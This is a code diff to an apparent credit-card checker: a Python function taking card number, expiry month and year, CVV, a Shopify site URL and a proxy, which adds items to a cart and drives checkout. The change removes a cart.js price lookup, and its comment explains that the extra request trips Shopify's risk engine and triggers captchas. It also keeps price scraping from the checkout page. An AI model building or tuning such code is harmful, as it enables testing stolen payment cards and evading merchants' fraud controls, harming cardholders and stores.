@@ -346,20 +346,9 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             if cart_resp.status_code != 200:
                 return False, f"Cart failed with status {cart_resp.status_code}", gateway, total_price, currency
 
-            _live_price = None
-            try:
-                cart_get = await session.get(url + '/cart.js', proxies=proxies)
-                if cart_get.status_code == 200:
-                    _cart_json = json.loads(cart_get.text)
-                    for _item in _cart_json.get('items', []):
-                        if str(_item.get('variant_id')) == str(variant_id):
-                            _cents = float(_item.get('price', 0))
-                            if _cents > 0:
-                                _live_price = str(_cents / 100.0)
-                            break
-            except Exception:
-                pass
-
+            # NOTE: no cart.js fetch here — the extra request between cart/add and checkout
+            # trips Shopify's risk engine and captcha-walls the session. Stale prices are
+            # corrected by the session-echo (merch line totalAmount) instead.
             checkout_headers = {
                 **headers,
                 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
@@ -406,14 +395,11 @@ async def process_card(cc, mes, ano, cvv, site_url, variant_id=None, proxy_str=N
             elif '"currencyCode":"' in text:
                 currency = extract_between(text, '"currencyCode":"', '"') or 'USD'
             
-            if _live_price:
-                subtotal = _live_price
-            else:
-                subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
-                           extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
-                if not subtotal:
-                    price_match = re.search(r'"price":\s*"([\d.]+)"', text)
-                    subtotal = price_match.group(1) if price_match else "0.01"
+            subtotal = extract_between(text, 'subtotalBeforeTaxesAndShipping&quot;:{&quot;value&quot;:{&quot;amount&quot;:&quot;', '&quot;') or \
+                     extract_between(text, '"subtotalBeforeTaxesAndShipping":{"value":{"amount":"', '"')
+            if not subtotal:
+                price_match = re.search(r'"price":\s*"([\d.]+)"', text)
+                subtotal = price_match.group(1) if price_match else "0.01"
 
             # Extract build ID (commitSha), source token, and identification signature
             unescaped_text = text.replace('&quot;', '"').replace('&amp;', '&').replace('&#39;', "'")
